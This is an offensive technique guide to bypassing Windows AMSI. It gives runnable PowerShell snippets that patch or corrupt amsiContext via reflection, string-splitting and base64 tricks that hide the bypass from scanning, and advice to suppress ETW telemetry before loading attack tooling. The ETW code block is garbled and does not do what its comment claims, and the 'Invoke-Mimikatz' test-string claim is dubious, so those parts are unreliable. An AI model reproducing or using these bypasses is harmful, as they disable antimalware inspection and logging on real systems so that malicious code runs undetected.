# AMSI bypass

AMSI (Antimalware Scan Interface) scans script content before execution across
PowerShell, VBScript, JScript, .NET, and other interpreters. Bypassing it allows
arbitrary script content to execute without being inspected.

## How AMSI works

When PowerShell evaluates a script block, it calls `AmsiScanBuffer` in `amsi.dll`
with the script content. The AV/EDR product's AMSI provider examines the content
and returns a result. If the result is not `AMSI_RESULT_CLEAN`, PowerShell refuses
to execute the block.

The bypass target is `AmsiScanBuffer` in the `amsi.dll` loaded into the current
process. Patching it to return clean unconditionally bypasses all subsequent AMSI
scans for the lifetime of the process.

## Patch AmsiScanBuffer via reflection

The canonical approach: find the function in memory and overwrite its first bytes
with a `ret` instruction (or equivalent that returns AMSI_RESULT_CLEAN).

The exact technique varies and must be evolved as detection catches up. The concept:

```powershell
# find amsi.dll in the current process, locate AmsiScanBuffer, patch the return value
# detection-aware implementations use:
# - string splitting to avoid AMSI scanning the bypass code itself
# - indirect reflection to avoid known method name patterns
# - obfuscated P/Invoke to avoid signature matching on the patch sequence

# base concept (detected by most current EDR - for educational illustration):
$a=[Ref].Assembly.GetTypes()
foreach($b in $a){
    if($b.Name -like '*iUtils'){
        $c=$b.GetFields('NonPublic,Static')
        foreach($d in $c){
            if($d.Name -like '*Context'){
                [IntPtr]$ptr=$d.GetValue($null)
                [Int32[]]$buf=@(0)
                [System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
            }
        }
    }
}
```

## Obfuscating the bypass

Detection of the bypass itself requires AMSI to scan the bypass code. This creates a
bootstrapping problem: to load a working bypass, the bypass must itself avoid being
flagged.

Techniques:

String splitting: `"Amsi" + "ScanBuffer"` is not a literal match for `AmsiScanBuffer`.

```powershell
$func = "Amsi" + "Scan" + "Buffer"
$lib  = "am" + "si.dll"
```

Encoding: base64-encode the bypass and decode at runtime, but the decode itself must
not be flagged.

```powershell
# encode the bypass separately, run the encoded string
# the runner must itself be clean enough to pass AMSI
powershell -enc BASE64_OF_BYPASS_SCRIPT
```

Out-of-process delivery: run the bypass from a process that does not have an AMSI
provider loaded (older unmonitored processes, custom hosts, specific LoLbins that do
not integrate AMSI).

## Force error in AMSI initialisation

An alternative to patching the scan function: corrupt the AMSI context structure so
that `AmsiScanBuffer` returns an error code, which some implementations treat as
"not scanned" rather than "malicious":

```powershell
# corrupt amsiContext (field offset differs by Windows version)
$a=[Ref].Assembly.GetTypes()
$b=($a|Where-Object{$_.Name -eq 'AmsiUtils'}).GetField('amsiContext','NonPublic,Static')
$ptr=[IntPtr]$b.GetValue($null)
$zero=0
[System.Runtime.InteropServices.Marshal]::WriteInt32($ptr, $zero)
```

## COM-based AMSI bypass

AMSI providers can be unregistered by removing their COM registration from the
registry, but this requires admin and affects all users. In a low-privilege context:

Some AMSI providers validate the calling process. Invoking a COM object that hosts
a script engine with AMSI disabled (older engines, unregistered providers) bypasses
inspection without patching.

## Testing the bypass

```powershell
# test: if AMSI is bypassed, this string (a known test string) should not be blocked
# AMSI uses this exact string as a test case in documentation
$test = 'Invoke-Mimikatz'
# if execution proceeds without a termination: bypass is working
```

After confirming the bypass, load subsequent tooling from memory without further AMSI
interference for that process session.

## ETW CLR bypass (companion technique)

AMSI bypass alone does not prevent ETW from logging the .NET assembly loads and
PowerShell script block content to the Windows event log. Patch the ETW write function
as well:

```powershell
# patch EtwEventWrite in ntdll.dll to suppress CLR telemetry
# concept: overwrite the first bytes with a ret instruction
# (implementation details change frequently as detection evolves)
$ntdll = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    ([System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate(
        [Func[IntPtr]]{ [System.Runtime.InteropServices.DllImportAttribute]::new }
    )), [Func[IntPtr]]
)
```

AMSI bypass and ETW bypass are usually applied together before loading any detection-
prone tooling.
